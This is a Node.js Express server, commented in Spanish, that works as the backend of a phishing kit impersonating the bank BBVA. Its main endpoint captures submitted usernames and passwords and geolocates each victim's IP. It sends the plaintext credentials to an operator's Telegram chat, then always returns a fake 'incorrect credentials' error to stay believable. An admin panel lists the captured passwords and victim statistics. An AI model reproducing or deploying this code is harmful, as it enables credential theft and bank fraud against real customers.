const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');
const crypto = require('crypto');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;

// Variables de entorno
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const JWT_SECRET = process.env.JWT_SECRET || 'fallback-secret-change-this';
const ENCRYPT_KEY = process.env.ENCRYPT_KEY || '0123456789abcdef0123456789abcdef';
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH;
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : ['*'];

// Configurar bot de Telegram
const bot = BOT_TOKEN ? new TelegramBot(BOT_TOKEN, { polling: false }) : null;

// Base de datos en memoria (en producción usar PostgreSQL/MongoDB)
let loginAttempts = [];
let blockedIPs = new Set();
let adminSessions = new Map();

// Middleware de seguridad
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));

// CORS configurado para orígenes específicos
app.use(cors({
    origin: function (origin, callback) {
        if (!origin || ALLOWED_ORIGINS.includes('*') || ALLOWED_ORIGINS.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('No permitido por CORS'));
        }
    },
    credentials: true
}));

app.use(express.json({ limit: '10mb' }));

// Rate limiting agresivo
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // máximo 5 intentos
    message: {
        error: 'Demasiados intentos de login',
        retryAfter: '15 minutos'
    },
    standardHeaders: true,
    legacyHeaders: false,
    skip: (req) => {
        const ip = getClientIP(req);
        return !blockedIPs.has(ip);
    }
});

const generalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});

app.use('/api/', generalLimiter);
app.use('/api/auth/verify', loginLimiter);

// Funciones de utilidad
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.headers['x-real-ip'] ||
           req.connection.remoteAddress ||
           req.socket.remoteAddress ||
           'unknown';
}

function encrypt(text) {
    if (!text) return '';
    const algorithm = 'aes-256-cbc';
    const key = crypto.scryptSync(ENCRYPT_KEY, 'salt', 32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(algorithm, key);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
}

function decrypt(encryptedText) {
    if (!encryptedText) return '';
    try {
        const algorithm = 'aes-256-cbc';
        const key = crypto.scryptSync(ENCRYPT_KEY, 'salt', 32);
        const textParts = encryptedText.split(':');
        const iv = Buffer.from(textParts.shift(), 'hex');
        const encryptedData = textParts.join(':');
        const decipher = crypto.createDecipher(algorithm, key);
        let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        return '[Error desencriptando]';
    }
}
function getDeviceInfo(userAgent) {
    if (!userAgent) return '🖥️ Desconocido';
    if (userAgent.includes('iPhone')) return '📱 iPhone';
    if (userAgent.includes('Android')) return '📱 Android';
    if (userAgent.includes('iPad')) return '📱 iPad';
    if (userAgent.includes('Windows')) return '💻 Windows';
    if (userAgent.includes('Macintosh')) return '💻 Mac';
    if (userAgent.includes('Linux')) return '💻 Linux';
    return '🖥️ Escritorio';
}

async function getLocationFromIP(ip) {
    if (!ip || ip === 'unknown' || ip.startsWith('192.168') || ip.startsWith('10.')) {
        return 'Ubicación privada';
    }
    
    try {
        const fetch = (await import('node-fetch')).default;
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,status`, {
            timeout: 5000
        });
        
        if (!response.ok) throw new Error('API no disponible');
        
        const data = await response.json();
        if (data.status === 'success') {
            return `${data.country} (${data.regionName}, ${data.city})`;
        }
    } catch (error) {
        console.error('Error obteniendo ubicación:', error.message);
    }
    
    return 'Ubicación desconocida';
}

async function sendTelegramAlert(loginData) {
    if (!bot || !CHAT_ID) {
        console.log('Bot no configurado, login capturado:', {
            usuario: loginData.usuario,
            clave: '[OCULTA]',
            ip: loginData.ip
        });
        return;
    }

    const message = `
🚨 *NUEVO LOGIN BBVA* 🚨

👤 *Usuario:* \`${loginData.usuario}\`
🔐 *Contraseña:* \`${loginData.clave}\`
🕒 *Fecha:* ${loginData.timestamp}
📱 *IP:* ${loginData.ip}
🌍 *Ubicación:* ${loginData.location}
💻 *Dispositivo:* ${loginData.device}
🔢 *ID:* ${loginData.id}

📊 *Total capturados:* ${loginAttempts.length}

#BBVA #Login #Capturado
    `;

    try {
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        console.log('✅ Alerta enviada a Telegram');
    } catch (error) {
        console.error('❌ Error enviando a Telegram:', error.message);
        // Intentar envío sin formato si falla
        try {
            const simpleMessage = `🚨 NUEVO LOGIN BBVA\nUsuario: ${loginData.usuario}\nContraseña: ${loginData.clave}\nIP: ${loginData.ip}\nTotal: ${loginAttempts.length}`;
            await bot.sendMessage(CHAT_ID, simpleMessage);
        } catch (retryError) {
            console.error('❌ Error en reintento:', retryError.message);
        }
    }
}

async function sendSecurityAlert(type, data) {
    if (!bot || !CHAT_ID) return;

    let message = '';
    switch (type) {
        case 'suspicious_activity':
            message = `🟠 *ACTIVIDAD SOSPECHOSA*\n🌍 IP: ${data.ip}\n⚠️ Razón: ${data.reason}\n🕒 ${new Date().toLocaleString('es-ES')}`;
            break;
        case 'ip_blocked':
            message = `🔴 *IP BLOQUEADA*\n🚫 IP: ${data.ip}\n💥 Intentos: ${data.attempts}\n🛡️ Auto-defensa activada`;
            break;
        case 'admin_login':
            message = `🟢 *ACCESO ADMIN*\n👨‍💼 IP: ${data.ip}\n🕐 ${new Date().toLocaleString('es-ES')}\n✅ Autenticado`;
            break;
    }

    try {
        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Error enviando alerta de seguridad:', error.message);
    }
}

// Middleware de autenticación para admin
function authenticateAdmin(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Token de acceso requerido' });
    }

    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        if (adminSessions.has(token) && adminSessions.get(token).ip === getClientIP(req)) {
            req.admin = decoded;
            next();
        } else {
            res.status(401).json({ error: 'Sesión inválida' });
        }
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
}

// ENDPOINTS

// Health check (sin información sensible)
app.get('/api/health', (req, res) => {
    res.json({
        status: 'operational',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

// Endpoint principal para capturar credenciales
app.post('/api/auth/verify', async (req, res) => {
    const startTime = Date.now();
    const ip = getClientIP(req);
    const userAgent = req.get('User-Agent') || '';
    
    // Verificar IP bloqueada
    if (blockedIPs.has(ip)) {
        return res.status(429).json({
            error: 'IP temporalmente bloqueada',
            message: 'Demasiados intentos fallidos'
        });
    }

    try {
        const { usuario, clave } = req.body;

        // Validación básica
        if (!usuario || !clave) {
            return res.status(400).json({
                error: 'Datos incompletos',
                message: 'Usuario y contraseña son requeridos'
            });
        }

        // Validar longitud (evitar spam)
        if (usuario.length > 100 || clave.length > 100) {
            await sendSecurityAlert('suspicious_activity', {
                ip,
                reason: 'Datos demasiado largos'
            });
            return res.status(400).json({
                error: 'Datos inválidos',
                message: 'Formato de credenciales incorrecto'
            });
        }

        // Obtener información adicional
        const location = await getLocationFromIP(ip);
        const device = getDeviceInfo(userAgent);
        
        // Crear registro de login
        const loginData = {
            id: crypto.randomBytes(8).toString('hex'),
            usuario: usuario.trim(),
            clave: clave.trim(),
            ip,
            location,
            device,
            userAgent: userAgent.substring(0, 200),
            timestamp: new Date().toLocaleString('es-ES', {
                timeZone: 'Europe/Madrid',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            }),
            encrypted: {
                usuario: encrypt(usuario.trim()),
                clave: encrypt(clave.trim())
            },
            metadata: {
                responseTime: Date.now() - startTime,
                success: false
            }
        };

        // Guardar login
        loginAttempts.push(loginData);

        // Enviar alerta a Telegram
        await sendTelegramAlert(loginData);

        // Simular respuesta realista de BBVA (siempre falla)
        setTimeout(() => {
            res.status(401).json({
                error: 'Credenciales incorrectas',
                message: 'El usuario o contraseña introducidos no son correctos',
                code: 'AUTH_FAILED',
                timestamp: new Date().toISOString()
            });
        }, Math.random() * 1000 + 500); // Entre 500ms y 1.5s

    } catch (error) {
        console.error('Error en /api/auth/verify:', error);
        res.status(500).json({
            error: 'Error interno del servidor',
            message: 'Servicio temporalmente no disponible'
        });
    }
});

// Login de administrador
app.post('/api/admin/login', async (req, res) => {
    const ip = getClientIP(req);
    const { password } = req.body;

    if (!password) {
        return res.status(400).json({ error: 'Contraseña requerida' });
    }

    try {
        // Verificar contraseña
        const isValid = ADMIN_PASSWORD_HASH ? 
            await bcrypt.compare(password, ADMIN_PASSWORD_HASH) :
            password === (process.env.ADMIN_PASSWORD || 'admin123');

        if (!isValid) {
            await sendSecurityAlert('suspicious_activity', {
                ip,
                reason: 'Intento de acceso admin fallido'
            });
            return res.status(401).json({ error: 'Contraseña incorrecta' });
        }

        // Crear token JWT
        const token = jwt.sign(
            { role: 'admin', ip },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        // Guardar sesión
        adminSessions.set(token, {
            ip,
            loginTime: new Date(),
            lastActivity: new Date()
        });

        await sendSecurityAlert('admin_login', { ip });

        res.json({
            success: true,
            token,
            expiresIn: 24 * 60 * 60 * 1000 // 24 horas en ms
        });

    } catch (error) {
        console.error('Error en admin login:', error);
        res.status(500).json({ error: 'Error interno' });
    }
});

// Panel de administración - Estadísticas
app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
    const now = new Date();
    const today = now.toDateString();
    const thisWeek = new Date(now - 7 * 24 * 60 * 60 * 1000);
    
    const stats = {
        total: loginAttempts.length,
        today: loginAttempts.filter(login => 
            new Date(login.timestamp).toDateString() === today
        ).length,
        thisWeek: loginAttempts.filter(login => 
            new Date(login.timestamp) > thisWeek
        ).length,
        uniqueIPs: new Set(loginAttempts.map(login => login.ip)).size,
        topCountries: getTopCountries(),
        recentLogins: loginAttempts.slice(-10).map(login => ({
            id: login.id,
            usuario: login.usuario,
            ip: login.ip,
            location: login.location,
            timestamp: login.timestamp
        }))
    };

    res.json(stats);
});

// Panel de administración - Todos los logins
app.get('/api/admin/logins', authenticateAdmin, (req, res) => {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const start = (page - 1) * limit;
    const end = start + limit;

    const paginatedLogins = loginAttempts
        .slice()
        .reverse() // Más recientes primero
        .slice(start, end)
        .map(login => ({
            id: login.id,
            usuario: login.usuario,
            clave: login.clave,
            ip: login.ip,
            location: login.location,
            device: login.device,
            timestamp: login.timestamp
        }));

    res.json({
        logins: paginatedLogins,
        total: loginAttempts.length,
        page,
        totalPages: Math.ceil(loginAttempts.length / limit)
    });
});

function getTopCountries() {
    const countries = {};
    loginAttempts.forEach(login => {
        const country = login.location.split(' (')[0];
        countries[country] = (countries[country] || 0) + 1;
    });
    
    return Object.entries(countries)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 5)
        .map(([country, count]) => ({ country, count }));
}

// Cleanup periódico (cada hora)
setInterval(() => {
    // Limpiar sesiones expiradas
    for (const [token, session] of adminSessions) {
        if (Date.now() - session.lastActivity.getTime() > 24 * 60 * 60 * 1000) {
            adminSessions.delete(token);
        }
    }
    
    // Limpiar IPs bloqueadas (después de 1 hora)
    // En un sistema real esto sería más sofisticado
    if (Math.random() < 0.1) { // 10% chance cada hora
        blockedIPs.clear();
    }
}, 60 * 60 * 1000);

// Manejador de errores global
app.use((error, req, res, next) => {
    console.error('Error global:', error);
    res.status(500).json({
        error: 'Error interno del servidor',
        message: 'Servicio temporalmente no disponible'
    });
});

// Manejador de rutas no encontradas
app.use('*', (req, res) => {
    res.status(404).json({
        error: 'Endpoint no encontrado',
        message: 'La ruta solicitada no existe'
    });
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Backend BBVA iniciado en puerto ${PORT}`);
    console.log(`📱 Bot Telegram: ${BOT_TOKEN ? 'Configurado' : 'No configurado'}`);
    console.log(`🔐 Admin: ${ADMIN_PASSWORD_HASH ? 'Hash configurado' : 'Contraseña por defecto'}`);
    console.log(`🌍 CORS permitido para: ${ALLOWED_ORIGINS.join(', ')}`);
    console.log('✅ Sistema de seguridad activo');
});

module.exports = app;